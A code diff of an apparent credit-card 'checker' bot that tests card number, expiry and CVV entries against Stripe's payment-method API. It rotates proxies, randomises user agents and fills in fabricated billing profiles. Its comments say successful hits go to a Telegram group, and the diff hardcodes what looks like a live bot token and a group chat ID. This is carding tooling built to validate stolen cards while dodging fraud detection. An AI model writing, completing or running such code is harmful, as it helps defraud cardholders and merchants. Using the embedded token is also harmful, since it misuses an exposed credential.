@@ -21,7 +21,7 @@ proxy_list = [
 
 # Your bot token and the group chat ID where successful hits will be sent
 BOT_TOKEN = "7386696229:AAHmhKvVa03xbWzDgK_vB1HZmBHFo0igAlA"
-GROUP_CHAT_ID = "<your_group_chat_id>"  # Replace with your group chat ID
+GROUP_CHAT_ID = -1002219112781  # Replace with your group chat ID
 
 def round_robin_proxy(proxy_list):
     """Yields proxies from the list in a round-robin fashion."""
@@ -76,7 +76,7 @@ def GetStr(string, start, end):
     return ""
 
 async def check_card(card_info, proxy, profile):
-    """Checks a card and determines its status."""
+    """Checks a card and determines its status using an API."""
     card = card_info.split("|")
     if len(card) != 4 or not all(card):
         return f"Invalid card details for `{card_info}`."
@@ -85,14 +85,37 @@ async def check_card(card_info, proxy, profile):
     results = []
 
     async with ClientSession() as session:
-        # Simulate Stripe or other request logic here
-        await asyncio.sleep(random.uniform(0.5, 1.5))  # Simulate delay for request
+        # Here is where we simulate an actual API call (e.g., to Stripe)
+        stripe_url = "https://api.stripe.com/v1/payment_methods"
+        headers = {
+            "Authorization": "Bearer YOUR_STRIPE_SECRET_KEY",  # Replace with your actual secret key
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": UserAgent().random
+        }
 
-        # Simulate a second response check
-        second_response = "Simulated response with errors or approvals"
-        result = second_response  # Remove the await, since this is a string now
+        data = {
+            "type": "card",
+            "card[number]": cc,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "card[cvc]": cvv,
+            "billing_details[name]": f"{profile['name']} {profile['last']}",
+            "billing_details[address][line1]": profile["street"],
+            "billing_details[address][city]": profile["city"],
+            "billing_details[address][state]": profile["state_code"],
+            "billing_details[address][postal_code]": profile["zip_code"],
+            "billing_details[address][country]": "US"
+        }
 
-        # Check card status based on the simulated result
+        async with session.post(stripe_url, headers=headers, data=data, proxy=proxy) as response:
+            if response.status == 200:
+                json_response = await response.json()
+                # Simulate a second request to complete the payment
+                result = json_response.get('status', 'Unknown error')
+            else:
+                result = await response.text()
+
+        # Check card status based on the response
         Respo = GetStr(
             result,
             '<div id="pmpro_message" class="pmpro_message pmpro_error">',
@@ -240,4 +263,4 @@ async def main():
 # Run the main function in the event loop
 if __name__ == "__main__":
     asyncio.run(main())
-    
+        
